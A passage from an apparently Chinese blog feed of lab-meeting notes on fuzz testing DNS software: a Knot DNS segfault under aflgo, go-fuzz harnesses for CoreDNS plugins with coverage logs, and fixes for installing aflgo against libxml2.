title="增大内存分配"></a>增大内存分配</h3><ul><li>将内存参数设置为<code>-m none</code>，不限制内存的使用</li><li>将in文件夹改为<code>-</code>，表示继续之间的模糊测试进度</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_LIBRARY_PATH=<span class="variable">$SUBJECT</span>/lib/isc/.libs:<span class="variable">$SUBJECT</span>/lib/dns/.libs <span class="variable">$AFLGO</span>/afl-fuzz -m none  -i - -o out <span class="variable">$SUBJECT</span>/fuzz/.libs/dns_message_parse</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;尝试对knot-dns进行测试&quot;&gt;&lt;a href=&quot;#尝试对knot-dns进行测试&quot; class=&quot;headerlink&quot; title=&quot;尝试对knot dns进行测试&quot;&gt;&lt;/a&gt;尝试对knot dns进行测试&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;尝试对knot dns进行测试，和之前皓辰的结果一样，程序找不到新路径&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;knot dns在运行时会产生Segment fault，不知道是什么原因，程序&lt;code&gt;_exit&lt;/code&gt;值为139。在github中查找了该退出代码，并没有找到相应文件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;tt@ubuntu:~/Desktop/dnsenv/aflgo-knot$ &lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; SUBJECT=&lt;span class=&quot;variable&quot;&gt;$PWD&lt;/span&gt;/knot-dns&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tt@ubuntu:~/Desktop/dnsenv/aflgo-knot$ &lt;span class=&quot;variable&quot;&gt;$SUBJECT&lt;/span&gt;/tests-fuzz/knotd_stdio -c &lt;span class=&quot;variable&quot;&gt;$SUBJECT&lt;/span&gt;/tests-fuzz/knotd_wrap/knot_stdio.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2023-03-19T20:17:55-0700 info: Knot DNS 3.3.dev.1678845372.e31fee4 starting&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2023-03-19T20:17:55-0700 info: loaded configuration file &lt;span class=&quot;string&quot;&gt;&amp;#x27;/home/tt/Desktop/dnsenv/aflgo-knot/knot-dns/tests-fuzz/knotd_wrap/knot_stdio.conf&amp;#x27;&lt;/span&gt;, mapsize 500 MiB&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2023-03-19T20:17:55-0700 warning: no network interface configured&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2023-03-19T20:17:55-0700 info: AFL, UDP handler listening on stdin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2023-03-19T20:17:55-0700 warning: removing stale PID file &lt;span class=&quot;string&quot;&gt;&amp;#x27;/tmp/knotd-fuzz/rundir/knot.pid&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2023-03-19T20:17:55-0700 info: loading 0 zones&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2023-03-19T20:17:55-0700 warning: no zones loaded&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2023-03-19T20:17:55-0700 info: starting server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2023-03-19T20:17:55-0700 info: server started &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; the foreground, PID 128184&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2023-03-19T20:17:55-0700 info: control, binding to &lt;span class=&quot;string&quot;&gt;&amp;#x27;/tmp/knotd-fuzz/rundir/knot.sock&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2023-03-19T20:17:55-0700 info: AFL, empty TCP handler&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Segmentation fault&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tt@ubuntu:~/Desktop/dnsenv/aflgo-knot$ &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; $?&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;139&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;aflchurn简介&quot;&gt;&lt;a href=&quot;#aflchurn简介&quot; class=&quot;headerlink&quot; title=&quot;aflchurn简介&quot;&gt;&lt;/a&gt;aflchurn简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/aflchurn/aflchurn&quot;&gt;aflchurn主页&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="afl" scheme="https://jingtianer.github.io/home/tags/afl/"/>
    
  </entry>
  
  <entry>
    <title>第九周记录</title>
    <link href="https://jingtianer.github.io/home/2023/03/13/%E7%BB%84%E4%BC%9A/%E7%AC%AC%E4%B9%9D%E5%91%A8%E5%B7%A5%E4%BD%9C%E8%AE%B0%E5%BD%95/"/>
    <id>https://jingtianer.github.io/home/2023/03/13/%E7%BB%84%E4%BC%9A/%E7%AC%AC%E4%B9%9D%E5%91%A8%E5%B7%A5%E4%BD%9C%E8%AE%B0%E5%BD%95/</id>
    <published>2023-03-13T04:15:37.000Z</published>
    <updated>2023-03-13T01:27:22.857Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用go-fuzz对coreDNS测试"><a href="#使用go-fuzz对coreDNS测试" class="headerlink" title="使用go-fuzz对coreDNS测试"></a>使用go-fuzz对coreDNS测试</h2><ul><li>这里是对CoreDns的插件进行模糊测试，参考官方插件<a href="https://github.com/coredns/proxy/blob/master/fuzz.go">proxy</a>的模糊测试方法</li></ul><h3 id="下载go-fuzz"><a href="#下载go-fuzz" class="headerlink" title="下载go-fuzz"></a>下载go-fuzz</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> go-fuzz; <span class="built_in">cd</span> go-fuzz</span><br><span class="line"><span class="built_in">export</span> GOPATH=`<span class="built_in">pwd</span>`             <span class="comment"># 暂时更改go path，将go-fuzz下载到指定位置</span></span><br><span class="line"><span class="built_in">cd</span> ..; <span class="built_in">mkdir</span> tmp; <span class="built_in">cd</span> tmp</span><br><span class="line">go mod init tmp</span><br><span class="line">go mod tidy</span><br><span class="line">go get -u github.com/dvyukov/go-fuzz/go-fuzz@latest github.com/dvyukov/go-fuzz/go-fuzz-build@latest</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">export</span> PATH=\<span class="variable">$PATH</span>:<span class="variable">$GOPATH</span>/bin/ | <span class="built_in">tee</span> -a ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc  <span class="comment"># 写入环境变量</span></span><br></pre></td></tr></table></figure><h3 id="获取go-fuzz的语料库"><a href="#获取go-fuzz的语料库" class="headerlink" title="获取go-fuzz的语料库"></a>获取go-fuzz的语料库</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get -d github.com/dvyukov/go-fuzz-corpus</span><br></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>对于一个项目</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">go mod init xxx</span><br><span class="line">go mod tidy</span><br><span class="line">go-fuzz-build</span><br><span class="line">go-fuzz</span><br></pre></td></tr></table></figure><blockquote><p>前提是必须编写Fuzz函数，作为go-fuzz的入口。Fuzz 函数的参数 data 是 go-fuzz生成的随机输入；返回值是一个整数，如果输入是有效的，则返回1，否则返回0。</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2023/03/12 18:16:31 workers: 8, corpus: 266 (48s ago), crashers: 0, restarts: 1/9642, execs: 1099293 (22890/sec), cover: 1596, <span class="built_in">uptime</span>: 48s</span><br><span class="line">2023/03/12 18:16:34 workers: 8, corpus: 266 (51s ago), crashers: 0, restarts: 1/9722, execs: 1176398 (23055/sec), cover: 1596, <span class="built_in">uptime</span>: 51s</span><br><span class="line">2023/03/12 18:16:37 workers: 8, corpus: 266 (54s ago), crashers: 0, restarts: 1/9778, execs: 1290718 (23891/sec), cover: 1596, <span class="built_in">uptime</span>: 54s</span><br><span class="line">2023/03/12 18:16:40 workers: 8, corpus: 266 (57s ago), crashers: 0, restarts: 1/9778, execs: 1398336 (24522/sec), cover: 1596, <span class="built_in">uptime</span>: 57s</span><br><span class="line">2023/03/12 18:16:43 workers: 8, corpus: 266 (1m0s ago), crashers: 0, restarts: 1/9788, execs: 1497597 (24950/sec), cover: 1596, <span class="built_in">uptime</span>: 1m0s</span><br><span class="line">2023/03/12 18:16:46 workers: 8, corpus: 266 (1m3s ago), crashers: 0, restarts: 1/9875, execs: 1589886 (25226/sec), cover: 1596, <span class="built_in">uptime</span>: 1m3s</span><br><span class="line">2023/03/12 18:16:49 workers: 8, corpus: 266 (1m6s ago), crashers: 0, restarts: 1/9827, execs: 1739488 (26346/sec), cover: 1759, <span class="built_in">uptime</span>: 1m6s</span><br><span class="line">2023/03/12 18:16:52 workers: 8, corpus: 266 (1m9s ago), crashers: 0, restarts: 1/9740, execs: 1840949 (26671/sec), cover: 1799, <span class="built_in">uptime</span>: 1m9s</span><br><span class="line">2023/03/12 18:16:55 workers: 8, corpus: 266 (1m12s ago), crashers: 0, restarts: 1/9806, execs: 1922080 (26686/sec), cover: 1799, <span class="built_in">uptime</span>: 1m12s</span><br></pre></td></tr></table></figure><h2 id="对CoreDNS进行模糊测试"><a href="#对CoreDNS进行模糊测试" class="headerlink" title="对CoreDNS进行模糊测试"></a>对CoreDNS进行模糊测试</h2><h3 id="coredns对go-fuzz的支持"><a href="#coredns对go-fuzz的支持" class="headerlink" title="coredns对go-fuzz的支持"></a>coredns对go-fuzz的支持</h3><p>在coredns的源码中可以找到一个Do函数，这使我们可以对CoreDNS的插件进行测试</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Do</span><span class="params">(p plugin.Handler, data []<span class="type">byte</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">ctx := context.TODO()</span><br><span class="line">r := <span class="built_in">new</span>(dns.Msg)</span><br><span class="line"><span class="keyword">if</span> err := r.Unpack(data); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span> <span class="comment">// plugin will never be called when this happens.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// If the data unpack into a dns msg, but does not have a proper question section discard it.</span></span><br><span class="line"><span class="comment">// The server parts make sure this is true before calling the plugins; mimic this behavior.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(r.Question) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _, err := p.ServeDNS(ctx, &amp;test.ResponseWriter&#123;&#125;, r); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="对proxy插件进行fuzz"><a href="#对proxy插件进行fuzz" class="headerlink" title="对proxy插件进行fuzz"></a>对proxy插件进行fuzz</h3><h4 id="编写Fuzz函数"><a href="#编写Fuzz函数" class="headerlink" title="编写Fuzz函数"></a>编写Fuzz函数</h4><p>例如，对proxy插件可以这样编写他的Fuzz函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Fuzz fuzzes proxy.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Fuzz</span><span class="params">(data []<span class="type">byte</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">c := caddy.NewTestController(<span class="string">&quot;dns&quot;</span>, <span class="string">&quot;proxy . 8.8.8.8:53&quot;</span>)</span><br><span class="line">up, err := NewStaticUpstreams(&amp;c.Dispenser)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">p := &amp;Proxy&#123;Upstreams: &amp;up&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> fuzz.Do(p, data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用go-fuzz编译"><a href="#使用go-fuzz编译" class="headerlink" title="使用go-fuzz编译"></a>使用go-fuzz编译</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go-fuzz-build</span><br></pre></td></tr></table></figure><h4 id="进行测试"><a href="#进行测试" class="headerlink" title="进行测试"></a>进行测试</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go-fuzz</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2023/03/12 19:31:09 workers: 8, corpus: 310 (58s ago), crashers: 0, restarts: 1/9678, execs: 3619593 (57454/sec), cover: 1189, <span class="built_in">uptime</span>: 1m3s</span><br><span class="line">2023/03/12 19:31:12 workers: 8, corpus: 310 (1m1s ago), crashers: 0, restarts: 1/9659, execs: 3767317 (57080/sec), cover: 1189, <span class="built_in">uptime</span>: 1m6s</span><br><span class="line">2023/03/12 19:31:15 workers: 8, corpus: 310 (1m4s ago), crashers: 0, restarts: 1/9691, execs: 3924923 (56883/sec), cover: 1189, <span class="built_in">uptime</span>: 1m9s</span><br><span class="line">2023/03/12 19:31:18 workers: 8, corpus: 345 (0s ago), crashers: 0, restarts: 1/9745, execs: 4093282 (56851/sec), cover: 1189, <span class="built_in">uptime</span>: 1m12s</span><br><span class="line">2023/03/12 19:31:21 workers: 8, corpus: 407 (0s ago), crashers: 0, restarts: 1/9749, execs: 4270438 (56939/sec), cover: 1538, <span class="built_in">uptime</span>: 1m15s</span><br><span class="line">2023/03/12 19:31:24 workers: 8, corpus: 407 (3s ago), crashers: 0, restarts: 1/9711, execs: 4409004 (56525/sec), cover: 1546, <span class="built_in">uptime</span>: 1m18s</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;使用go-fuzz对coreDNS测试&quot;&gt;&lt;a href=&quot;#使用go-fuzz对coreDNS测试&quot; class=&quot;headerlink&quot; title=&quot;使用go-fuzz对coreDNS测试&quot;&gt;&lt;/a&gt;使用go-fuzz对coreDNS测试&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;这里是对CoreDns的插件进行模糊测试，参考官方插件&lt;a href=&quot;https://github.com/coredns/proxy/blob/master/fuzz.go&quot;&gt;proxy&lt;/a&gt;的模糊测试方法&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;下载go-fuzz&quot;&gt;&lt;a href=&quot;#下载go-fuzz&quot; class=&quot;headerlink&quot; title=&quot;下载go-fuzz&quot;&gt;&lt;/a&gt;下载go-fuzz&lt;/h3&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;mkdir&lt;/span&gt; go-fuzz; &lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; go-fuzz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; GOPATH=`&lt;span class=&quot;built_in&quot;&gt;pwd&lt;/span&gt;`             &lt;span class=&quot;comment&quot;&gt;# 暂时更改go path，将go-fuzz下载到指定位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; ..; &lt;span class=&quot;built_in&quot;&gt;mkdir&lt;/span&gt; tmp; &lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; tmp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;go mod init tmp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;go mod tidy&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;go get -u github.com/dvyukov/go-fuzz/go-fuzz@latest github.com/dvyukov/go-fuzz/go-fuzz-build@latest&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; PATH=\&lt;span class=&quot;variable&quot;&gt;$PATH&lt;/span&gt;:&lt;span class=&quot;variable&quot;&gt;$GOPATH&lt;/span&gt;/bin/ | &lt;span class=&quot;built_in&quot;&gt;tee&lt;/span&gt; -a ~/.bashrc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;source&lt;/span&gt; ~/.bashrc  &lt;span class=&quot;comment&quot;&gt;# 写入环境变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;获取go-fuzz的语料库&quot;&gt;&lt;a href=&quot;#获取go-fuzz的语料库&quot; class=&quot;headerlink&quot; title=&quot;获取go-fuzz的语料库&quot;&gt;&lt;/a&gt;获取go-fuzz的语料库&lt;/h3&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;go get -d github.com/dvyukov/go-fuzz-corpus&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
  </entry>
  
  <entry>
    <title>aflgo的安装与使用</title>
    <link href="https://jingtianer.github.io/home/2023/03/02/%E7%BB%84%E4%BC%9A/aflgo%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/"/>
    <id>https://jingtianer.github.io/home/2023/03/02/%E7%BB%84%E4%BC%9A/aflgo%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</id>
    <published>2023-03-02T04:15:37.000Z</published>
    <updated>2023-03-06T02:07:21.298Z</updated>
    
    <content type="html"><![CDATA[<h2 id="aflgo的安装与测试"><a href="#aflgo的安装与测试" class="headerlink" title="aflgo的安装与测试"></a>aflgo的安装与测试</h2><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><h4 id="执行一键安装脚本"><a href="#执行一键安装脚本" class="headerlink" title="执行一键安装脚本"></a>执行一键安装脚本</h4><p>先克隆aflgo<a href="https://github.com/aflgo/aflgo.git">仓库</a>，脚本位于<code>./scripts/build</code>下的<code>aflgo-build.sh</code></p><p>使用一键安装脚本安装有几个问题</p><ul><li><p>编译时报错<code>error: ‘numeric_limits’ is not a member of ‘std’</code>，这是因为llvm源文件少引用了一个头文件，编辑文件<code>/root/build/llvm_tools/llvm-11.0.0.src/utils/benchmark/src/benchmark_register.h</code>，加入以下头文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;limits&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>或在脚本解压操作完成后，执行一次以下命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;5i#include&lt;limits&gt;&#x27;</span> ~/build/llvm_tools/llvm-11.0.0.src/utils/benchmark/src/benchmark_register.h</span><br></pre></td></tr></table></figure></li><li><p>apt找不到部分包</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E: Package <span class="string">&#x27;python-dev&#x27;</span> has no installation candidate</span><br><span class="line">E: Unable to locate package python-bs4</span><br></pre></td></tr></table></figure></li><li><p>在脚本<code># install some packages</code>下修改为以下内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y python2-dev python3 python3-dev python3-pip autoconf automake libtool-bin python3-bs4 libboost-all-dev <span class="comment"># libclang-11.0-dev</span></span><br></pre></td></tr></table></figure></li><li><p>apt&#x2F;apt-get前没有<code>sudo</code>，需要加上，最好不要sudo整个脚本，否则会将文件编译到<code>/root/build</code>下</p></li><li><p>对于<code>ubuntu 16.04</code>版本，将脚本中判断系统版本的地方修改成以下内容，他想判断系统是否大于<code>1604</code>，但在16.04版本中获取的版本号是带引号的</p></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$UBUNTU_YEAR</span>&quot;</span> &gt; <span class="string">&#x27;&quot;16&#x27;</span> || <span class="string">&quot;<span class="variable">$UBUNTU_MONTH</span>&quot;</span> &gt; <span class="string">&#x27;04&quot;&#x27;</span> ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    sudo apt-get install -y python3-distutils</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h3 id="确定SUBJECT环境变量"><a href="#确定SUBJECT环境变量" class="headerlink" title="确定SUBJECT环境变量"></a>确定SUBJECT环境变量</h3><p><code>$SUBJECT</code>就是需要被fuzz的源码目录，这里我们先对<code>libxml2</code>进行测试，那么<code>$SUBJECT</code>定义如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Clone subject repository</span></span><br><span class="line">git <span class="built_in">clone</span> https://gitlab.gnome.org/GNOME/libxml2</span><br><span class="line"><span class="built_in">export</span> SUBJECT=<span class="variable">$PWD</span>/libxml2</span><br></pre></td></tr></table></figure><h3 id="生成BBTarget"><a href="#生成BBTarget" class="headerlink" title="生成BBTarget"></a>生成BBTarget</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> SUBJECT=<span class="variable">$PWD</span>/libxml2</span><br><span class="line"><span class="comment"># Setup directory containing all temporary files</span></span><br><span class="line"><span class="built_in">mkdir</span> temp</span><br><span class="line"><span class="built_in">export</span> TMP_DIR=<span class="variable">$PWD</span>/temp</span><br><span class="line"><span class="comment"># Download commit-analysis tool</span></span><br><span class="line">wget https://raw.githubusercontent.com/jay/showlinenum/develop/showlinenum.awk</span><br><span class="line"><span class="built_in">chmod</span> +x showlinenum.awk</span><br><span class="line"><span class="built_in">mv</span> showlinenum.awk <span class="variable">$TMP_DIR</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate BBtargets from commit ef709ce2</span></span><br><span class="line"><span class="built_in">pushd</span> <span class="variable">$SUBJECT</span></span><br><span class="line">  git checkout ef709ce2</span><br><span class="line">  git diff -U0 HEAD^ HEAD &gt; <span class="variable">$TMP_DIR</span>/commit.diff</span><br><span class="line"><span class="built_in">popd</span></span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$TMP_DIR</span>/commit.diff |  <span class="variable">$TMP_DIR</span>/showlinenum.awk show_header=0 path=1 | grep -e <span class="string">&quot;\.[ch]:[0-9]*:+&quot;</span> -e <span class="string">&quot;\.cpp:[0-9]*:+&quot;</span> -e <span class="string">&quot;\.cc:[0-9]*:+&quot;</span> | <span class="built_in">cut</span> -d+ -f1 | rev | <span class="built_in">cut</span> -c2- | rev &gt; <span class="variable">$TMP_DIR</span>/BBtargets.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print extracted targets. </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Targets:&quot;</span></span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$TMP_DIR</span>/BBtargets.txt</span><br></pre></td></tr></table></figure><blockquote><p>根据git commit提交记录中的代码差异文件<code>*.diff</code>，生成<code>BBtargets.txt</code>，其文件格式为<code>文件名:行号</code></p></blockquote><h3 id="生成distance"><a href="#生成distance" class="headerlink" title="生成distance"></a>生成distance</h3><ul><li>根据上一步的<code>BBtargets.txt</code>，使用gold插件，生成CFG(控制流程图)和CG(调用图)</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 